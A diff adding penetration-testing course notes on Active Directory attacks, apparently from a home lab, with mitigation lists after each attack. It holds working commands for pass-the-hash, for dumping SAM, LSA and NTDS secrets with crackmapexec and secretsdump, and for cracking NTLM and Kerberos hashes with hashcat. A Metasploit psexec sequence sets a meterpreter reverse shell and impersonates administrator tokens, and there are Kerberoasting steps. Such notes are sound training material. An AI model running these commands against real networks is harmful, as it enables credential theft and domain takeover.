@@ -2,17 +2,142 @@
 
 ## Pass the Password Attacks
 
+#### crackmapexec
+
+```bash
+kali@kali:~/ctf/tcm/peh$ crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
+# Dump the SAM hashes
+--sam
+# Dump the LSA secrets
+--lsa
+# Dump the NTDS.dit
+--ntds
+```
+
+#### psexec
+
+```bash
+kali@kali:~/ctf/tcm/peh$ /usr/share/doc/python3-impacket/examples/psexec.py marvel/fcastle:Password1@192.168.57.142
+```
+
 ## Dumping Hashes with secretsdump.py
+
+#### secretsdump
+
+```bash
+kali@kali:~/ctf/tcm/peh$ /usr/share/doc/python3-impacket/examples/secretsdump.py marvel/fcastle:Password1@192.168.57.141
+```
 
 ## Cracking NTLM Hashes with Hashcat
 
+#### hashcat
+
+```bash
+kali@kali:~/ctf/tcm/peh$ hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt 
+```
+
 ## Pass the Hash Attacks
+
+#### crackmapexec
+
+```bash
+kali@kali:~/ctf/tcm/peh$ crackmapexec smb 192.168.57.0/24 -u "Frank Castle" -H <HASH> --local-auth
+```
 
 ## Pass Attack Mitigations
 
+Hard to completely prevent, but we can make it more difficult on an attacker:
+
+* Limit account re-use
+  * Avoid re-using local admin password
+  * Disable Guest and Administrator accounts
+  * Limit who is a local administrator (least privilege)
+* Utilize strong passwords
+  * The longer the better
+  * Avoid using common words
+  * Long sentences
+* Privilege Access Management (PAM)
+  * Check out/in sensitive accounts when needed
+  * Automatically rotate passwords on check out and check in
+  * Limits pass attacks as hash/password is strong and constantly rotated
+
 ## Token Impersonation
 
+### Overview
+
+#### What are tokens?
+
+* Temporary keys that allow you to access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.
+
+#### Two Types
+
+* Delegate - Created for logging into a machine or using Remote Desktop
+* Impersonate - "non-interactive" such as attach a network drive or a domain logon script
+
+### Token Impersonation with Incognito
+
+#### Metasploit
+
+```bash
+msfconsole
+use exploit/windows/smb/psexec
+# Set RHOSTS, SMBDomain, SMBPass, and SMBUser; 
+# set target 2; set payload windows/x64/meterpreter/reverse_tcp; set LHOST
+run
+# hashdump
+# getuid
+# sysinfo
+load incognito
+help
+list_tokens -u
+impersonate_token marvel\\administrator
+shell
+whoami
+```
+
+### Mitigation
+
+#### Strategies
+
+* Limit user/group token creation permissions
+* Account tiering
+* Local admin restriction
+
 ## Kerberoasting
+
+### Overview
+
+[https://medium.com/@Shorty420/kerberoasting-9108477279cc](https://medium.com/@Shorty420/kerberoasting-9108477279cc)
+
+#### Steps
+
+1. Get SPNs, Dump Hash
+   1. `python GetUserSPNs.py <DOMAIN/username:password> dc-ip <ip of DC> -request`
+2. Crack that hash
+   1. `hashcat -m 13100 kerberoast.txt rockyou.txt`
+
+### Example
+
+#### GetUserSPNs
+
+```bash
+GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.57.140 -request
+```
+
+Copy the hash from the output and paste it into a text file.
+
+#### hashcat
+
+```bash
+hashcat -m 13100 hashes.txt rockyou.txt
+```
+
+### Mitigation
+
+#### Strategies
+
+* Strong Passwords
+* Least privileges
 
 ## GPP / cPassword Attacks Overview
 
